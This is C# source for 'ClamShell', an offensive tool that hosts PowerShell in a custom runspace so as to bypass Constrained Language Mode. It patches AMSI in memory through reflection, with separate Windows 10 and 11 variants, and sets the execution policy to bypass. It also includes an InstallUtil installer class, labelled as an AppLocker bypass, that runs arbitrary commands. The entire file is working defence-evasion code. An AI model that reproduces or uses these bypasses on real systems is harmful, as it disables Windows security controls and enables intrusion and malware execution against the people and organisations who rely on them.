using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace ClamShell
{
    class Program
    {
        static void Main(string[] args)
        {
            string command = "";
            if (args.Length > 0)
            {
                command = args[0];
            }
            Shell.Run(command);
        }

        
    }

    // applocker bypass with InstallUtil
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string command = "";
            if (this.Context.Parameters.ContainsKey("command"))
            {
                command = this.Context.Parameters["command"];
            }
            Shell.Run(command);
        }
    }

    class Shell
    {
        public static void Run(string command)
        {
            Banner();
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            PSDataCollection<PSObject> output = new PSDataCollection<PSObject>();
            output.DataAdded += Output_DataAdded;
            ps.Streams.Error.DataAdded += Error_DataAdded;

            Patch(ps, output);
            Policy(ps, output);

            if (command.Length > 0) {
                String cmd = "IEX @'\n" + command + "\n'@ | Out-String";
                ps.AddScript(cmd);
                ps.Invoke(null, output);
            } else {
                while (true)
                {

                    String cd = ps.Runspace.SessionStateProxy.Path.CurrentLocation.ToString();

                    Console.Write("CLAM {0}> ", cd);
                    String input = Console.ReadLine();
                    if (input == "")
                    {
                        continue;
                    }
                    if (input == "exit")
                    {
                        break;
                    }
                    String cmd = "IEX @'\n" + input + "\n'@ | Out-String";
                    ps.AddScript(cmd);
                    try
                    {
                        ps.Invoke(null, output);
                    }
                    catch (ParseException e)
                    {
                        Console.WriteLine(e.Message);
                    }
                    ps.Commands.Clear();
                }
            }
            
            rs.Close();
        }


        private static void Banner()
        {
            Console.WriteLine("<> <> <>     <> <> <>");
            Console.WriteLine("<> <> ClamShell <> <>");
            Console.WriteLine("<> <> <>     <> <> <>");
            Console.WriteLine("Powershell Constrained Language Mode and AMSI Bypass");
        }

        // amsi patch
        private static void Patch(PowerShell ps, PSDataCollection<PSObject> output)
        {
            String script = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};";
            // win10
            String script2 = "$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)";
            // win11
            String script3 = "$ptr2 = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf2 = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf2, 0, $ptr2, 8)";
            ps.AddScript(script);
            ps.AddScript(script2);
            ps.AddScript(script3);
            ps.Invoke(null, output);
        }

        // ExecutionPolicy
        private static void Policy(PowerShell ps, PSDataCollection<PSObject> output)
        {
            String script = "Set-ExecutionPolicy -Scope CurrentUser bypass";
            ps.AddScript(script);
            ps.Invoke(null, output);
        }

        private static void Output_DataAdded(object sender, DataAddedEventArgs e)
        {
            PSObject newRecord = ((PSDataCollection<PSObject>)sender)[e.Index];
            Console.WriteLine(newRecord);
        }

        private static void Verbose_DataAdded(object sender, DataAddedEventArgs e)
        {
            VerboseRecord newRecord = ((PSDataCollection<VerboseRecord>)sender)[e.Index];
            Console.Error.WriteLine(newRecord);
        }

        private static void Debug_DataAdded(object sender, DataAddedEventArgs e)
        {
            DebugRecord newRecord = ((PSDataCollection<DebugRecord>)sender)[e.Index];
            Console.Error.WriteLine(newRecord);
        }

        private static void Progress_DataAdded(object sender, DataAddedEventArgs e)
        {
            ProgressRecord newRecord = ((PSDataCollection<ProgressRecord>)sender)[e.Index];
            Console.Error.WriteLine(newRecord);
        }

        private static void Warning_DataAdded(object sender, DataAddedEventArgs e)
        {
            string NORMAL = Console.IsOutputRedirected ? "" : "\x1b[39m";
            string RED = Console.IsOutputRedirected ? "" : "\x1b[91m";
            WarningRecord newRecord = ((PSDataCollection<WarningRecord>)sender)[e.Index];
            Console.Error.WriteLine(RED + newRecord + NORMAL);
        }

        private static void Error_DataAdded(object sender, DataAddedEventArgs e)
        {
            string NORMAL = Console.IsOutputRedirected ? "" : "\x1b[39m";
            string RED = Console.IsOutputRedirected ? "" : "\x1b[91m";
            ErrorRecord newRecord = ((PSDataCollection<ErrorRecord>)sender)[e.Index];
            Console.Error.WriteLine(RED + newRecord + NORMAL);
        }
    }

}